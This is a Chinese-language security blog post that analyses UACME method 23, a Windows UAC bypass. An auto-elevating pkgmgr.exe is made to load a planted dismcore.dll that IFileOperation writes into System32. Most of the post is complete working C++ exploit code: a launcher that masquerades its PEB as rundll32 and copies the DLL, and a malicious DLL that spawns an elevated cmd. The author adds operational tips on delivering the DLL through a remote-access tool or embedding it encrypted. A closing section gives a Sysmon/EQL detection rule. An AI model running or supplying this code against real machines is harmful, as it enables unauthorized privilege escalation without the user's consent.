---
layout:       post
title:        "BypassUAC 白名单_PkgMgr_DLL劫持"
subtitle:     "UACME_23技术分析，利用IFileOperation+白名单+dll劫持绕过UAC"
author:      "Ga0weI"
header-style: text
catalog:      true
tags:
    - BypassUAC
    - 代码
    - dllHijack
    - ELK
    - windows
---



# 0x01 前言

UACME这个项目基本时收录了目前所有公开的bypassuac手段，这些绕过手段大致可以分为几大类，其中最常见的一类就是：

**通过利用IFileOperation往高权限目录（system32\syswow）写dll文件，劫持windows内置的能够不弹窗自提权的exe，从而实现提权；**

这篇blog，主要就是详细分析这种bypassuac的手段原理和实现方式；



# 0x02 原理

这里我们拿第UACME里面的第23个方法举例：

![image-20240718215553149](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718215553149.png)

该方式利用uac校验流程``AilsEXESafeToAutoApprove``里面的``g_lpAutoApproveEXEList``白名单中的pkgmgr.exe ，绕过uac弹窗

![image-20240718170726185](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718170726185.png)

pkgmgr.exe本身是windows下的包管理器，用于安装、卸载、删除一些包文件的；

但是从某个版本开始windows开始弃用pkgmgr.exe，转而使用dism.exe 来进行相关操作；

亲厚版本运行pkgmgr.exe的差异：

![image-20240718172134233](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718172134233.png)

![image-20240718172123353](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718172123353.png)

但是为了兼容，在某些过度版本里面，这里并不是说直接丢弃pkgmgr.exe，而是将pkgmgr.exe变成一个转换器，我们运行这个pkgmgr.exe 其内部转化相关参数，然后运行dism.exe实现对应的功能；

比如如下图，使用windows7_7600的时候，运行pkgmgr.exe相关命令的时候，通过procmon我们可以看到其调用同目录下的dism.exe：

- 运行命令``pkgmgr /iu:TelnetClient ``   ，为windows安装telnet;

![image-20240718171817236](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718171817236.png)

![image-20240718171941963](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718171941963.png)



然后有个叫 Leo Davidson derivative的，发现了一个可以利用的间隙，造成dll劫持，笔者推测他发现的过程是这样的：

像上面运行，我们可以看到pkgmgr.exe在调用dism.exe之后，dism.exe加载了很多dll，这些加载的dll大多是来自``c:\windows\system32``，如下图：

![image-20240718173224421](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718173224421.png)

![image-20240718174023450](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718174023450.png)

他发现，除此之外在下面有五个个dll是在system32下的一个叫dism的文件夹里面加载的；

我们都知道windows默认情况下dll加载优先级中：可执行文件所在的目录是优先级是最早的；那么dism.exe 所在的目录是system32,也就是说这里加载优先级最高的目录应该是system32;那么是不是可以构成了dll劫持的条件了；欸，一测发现，的确如此；



# 0x03 落地实现以及测试

要实现这个劫持提权，我们需要做的准备工作:

1、要把恶意dll文件写入system32路径，这个路径需要高权限才能写入，这里可以使用IFileOperation com组件越权写；

2、运行pkgmgr.exe 程序



这里我们也自构代码实现下(当然也可以直接使用uacme)：

## 一、EXE

编写exe,实现利用IFileOperation越权写``dismcore.dll``文件到system32下，然后运行pkgmgr.exe（注意这里有一个细节，不能直接空运行，空运行pkgmgr.exe是不会调用dism.exe，只会弹出来个带ui的help，这里笔者使用的测试命令是  ``pkgmgr /iu:TelnetClient``为windows安装telnet）；

```c++
#include <windows.h>
#include <shobjidl.h>
#include <atlbase.h>

#define RTL_MAX_DRIVE_LETTERS 32
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60
#define GDI_BATCH_BUFFER_SIZE 310

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;


typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING* PSTRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, * PCLIENT_ID64;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;

typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, * PPEB;

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, * PTEB;

typedef VOID(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
    );

typedef PVOID NTAPI RTLINITUNICODESTRING(
    _Inout_	PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString
);
typedef RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;
LPRTLINITUNICODESTRING			RtlInitUnicodeString;

typedef NTSTATUS NTAPI RTLENTERCRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;
LPRTLENTERCRITICALSECTION			RtlEnterCriticalSection;

typedef NTSTATUS NTAPI RTLLEAVECRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;
LPRTLLEAVECRITICALSECTION			RtlLeaveCriticalSection;

typedef NTSTATUS NTAPI LDRENUMERATELOADEDMODULES(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);
typedef LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;
LPLDRENUMERATELOADEDMODULES			LdrEnumerateLoadedModules;

typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
    _In_        HANDLE ProcessHandle,
    _Inout_     PVOID* BaseAddress,
    _In_        ULONG_PTR ZeroBits,
    _Inout_     PSIZE_T RegionSize,
    _In_        ULONG AllocationType,
    _In_        ULONG Protect
);
typedef NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;
LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;


LPWSTR g_lpszRundll = TEXT("C:\\windows\\system32\\rundll32.exe");

VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
)
{
    PPEB Peb = (PPEB)Context;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszRundll);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, L"rundll32.exe");
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

__inline struct _PEB* NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

VOID supMasqueradeProcess(
    VOID
)
{
    NTSTATUS Status;
    PPEB    Peb = NtCurrentPeb();
    SIZE_T  RegionSize;

    PVOID g_lpszExplorer = NULL;
    RegionSize = 0x1000;

    Status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &g_lpszExplorer,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (NT_SUCCESS(Status)) {
        RtlEnterCriticalSection(Peb->FastPebLock);

        RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszRundll);
        RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, g_lpszRundll);

        RtlLeaveCriticalSection(Peb->FastPebLock);

        LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
    }
}

int main(int argc, CHAR* argv[])
{
    HINSTANCE hinstStub = GetModuleHandleA("ntdll.dll");
    if (hinstStub)
    {
        RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");
        if (!RtlInitUnicodeString)
        {
            printf("Could not find RtlInitUnicodeString entry point in NTDLL.DLL");
            exit(0);
        }

        RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(hinstStub, "RtlEnterCriticalSection");
        if (!RtlEnterCriticalSection)
        {
            printf("Could not find RtlEnterCriticalSection entry point in NTDLL.DLL");
            exit(0);
        }

        RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(hinstStub, "RtlLeaveCriticalSection");
        if (!RtlLeaveCriticalSection)
        {
            printf("Could not find RtlLeaveCriticalSection entry point in NTDLL.DLL");
            exit(0);
        }

        LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(hinstStub, "LdrEnumerateLoadedModules");
        if (!LdrEnumerateLoadedModules)
        {
            printf("Could not find LdrEnumerateLoadedModules entry point in NTDLL.DLL");
            exit(0);
        }

        NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");
        if (!NtAllocateVirtualMemory)
        {
            printf("Could not find NtAllocateVirtualMemory entry point in NTDLL.DLL");
            exit(0);
        }
    }
    else
    {
        printf("Could not GetModuleHandle of NTDLL.DLL");
        exit(0);
    }

    supMasqueradeProcess();
    printf("begin move dll by IFileOperation");
    getchar();
    HMODULE hModule = NULL;
    IFileOperation* fileOperation = NULL;
    LPCWSTR DFileName = L"dismcore.dll";
    LPCWSTR SourceFullPath = L"C:\\ProgramData\\dismcore.dll";
    LPCWSTR DestPath = L"C:\\windows\\System32";
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {

        hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
        if (SUCCEEDED(hr)) {
            hr = fileOperation->SetOperationFlags(
                FOF_NOCONFIRMATION |
                FOF_SILENT |
                FOFX_SHOWELEVATIONPROMPT |
                FOFX_NOCOPYHOOKS |
                FOFX_REQUIREELEVATION |
                FOF_NOERRORUI);
            if (SUCCEEDED(hr)) {
                IShellItem* from = NULL, * to = NULL;
                hr = SHCreateItemFromParsingName(SourceFullPath, NULL, IID_PPV_ARGS(&from));
                if (SUCCEEDED(hr)) {
                    if (DestPath)
                        hr = SHCreateItemFromParsingName(DestPath, NULL, IID_PPV_ARGS(&to));
                    if (SUCCEEDED(hr)) {
                        hr = fileOperation->CopyItem(from, to, DFileName, NULL);
                        if (NULL != to)
                            to->Release();
                    }
                    from->Release();
                }
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->PerformOperations();
                }
            }
            fileOperation->Release();
        }
        CoUninitialize();
    }
    printf("begin run pkgmgr.exe");
    getchar();

    if (!ShellExecuteA(NULL, "open", "pkgmgr.exe", "/iu:TelnetClient", NULL, SW_SHOWNORMAL))
    {
        printf("ShellExecute failed (%d)", GetLastError());
        return 1;
    }
    else {
        getchar();
    }

    return 0;
}
```



## 二、DLL

编写恶意dll,dll随便实现点功能，这里写弹窗和起一个cmd；并手动将dll文件写入到一个低权限位置，（这里笔者用的是``c:\programdata\``，实际的攻防场景，可以通过远控低权限上传即可，或者直接把这个dll加密内置到上面的exe里面，运行时解密，随便先丢到一个低权限文件夹即可，这里我们主要测试提权，所以就不整那么麻烦了）

```c++
#include <shellapi.h>
#include<iostream>
#include<windows.h>


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    LPCSTR applicationName = "c:\\windows\\system32\\cmd.exe";
    LPSTR commandLine = NULL;

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    switch (ul_reason_for_call)
    {


    case DLL_PROCESS_ATTACH:
        //ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOWNORMAL);//奇怪这个不太行，然后换成CreateProcess就可以了
        MessageBoxA(NULL, "tetx", NULL, MB_OK);

        if (!CreateProcessA(
            applicationName,   
            commandLine,       
            NULL,              
            NULL,              
            FALSE,             
            0,                 
            NULL,              
            NULL,              
            &si,               
            &pi                
        )) {
            printf("CreateProcessA failed (%d)", GetLastError());
            return 1;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```



## 三、测试效果

测试环境：win10—18363

运行前：

![image-20240718180302464](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718180302464.png)



运行后：

![image-20240718180411510](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718180411510.png)

点击确定，如下图，可以看到dism.exe 下面起了一个cmd；

![image-20240718180457108](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718180457108.png)

借助ProcessExplorer判断下这个cmd的权限，可以看到整个过程没有uac弹窗，我们拿到了一个管理员权限的cmd进程（实战的时候把这个放成我们的样本即可）；

![image-20240718180752623](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240718180752623.png)





# 0x04 思考&提升

这里我们提出两个疑问并验证：

1、上面我们提到运行pkgmgr.exe命令的时候，调用了同目录下面的dism.exe，其dism.exe原本加载的``c:\windows\system32\dism``文件夹下面5个dll，uacme里面提到存在劫持的只有dismcore.dll，这里测试的时候，我们也选择的就是这个；那么其他四个dll是否也存在劫持了，按道理来说是不是也存在，所以这里我们提出疑问并进行测试；



如下两图，这里是使用

![image-20240719170208901](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240719170208901.png)

![image-20240719170323690](/img/BypassUAC_白名单_pkgmgr_dll劫持/image-20240719170323690.png)



2、我们来分析下，这种bypassuac方法的适用范围；

- 首先IFileOperation com越权写肯定要可以；

  通过测试，``windows7-7600——————windows10-18363``是OK的

- 其次是pkgmgr.exe是通过调用dism.exe实现功能的版本；

​		通过测试，测了几个版本，这个在win7、win10上好像都行



所以该提权方式的利用范围大致就是：

``windows7-7600——————windows10-18363``



# 0x05 检测

不妨思考下终端上如何检测这种攻击手段；

这里我们拿sysmon日志举例，edr相关产品类似；

上面提权过程，发生如下两个动作

- 文件创建 ：需要通过IFileOperation越权写dismcore.dll到sysmon32下

- 进程创建，恶意程序启动pkgmgr.exe，pkgmgr.exe启动dism.exe，dism.exe加载一个 位于system32下的dismcore.dll（正常应该是``system32\dism``下的dismcore.dll）

这两个大动作，sysmon都是可以捕获到的，但是遗憾的是，一般我们使用sysmon的时候并不会收全量日志，因为如果全开系统进程带来的噪音太大了，所以这里我们测试的时候选择使用率比较高的开源sysmon config文件；

配置文件：``https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml``

安装好sysmon之后，然后运行上面提权工具；

捕获的日志通过evtx2es导入到es里面，这里我们尝试使用eql去发现此攻击行为；

笔者最后编写的eql语句如下，（这里果然如我们所料，这套配置下，sysmon没有收dism.exe的dll加载日志，所以这里面的一个非常明显异常路径dismcore.dll加载，该特征匹配不到）

```txt
      sequence with maxspan=5s
      [any where winlog.event_id==11 and winlog.event_data.Image regex ".*DllHost\\.exe.*" and  winlog.event_data.TargetFilename regex ".*dismcore\\.dll"]
      [any where winlog.event_id==1 and winlog.event_data.Image regex ".*PkgMgr\\.exe.*"]      
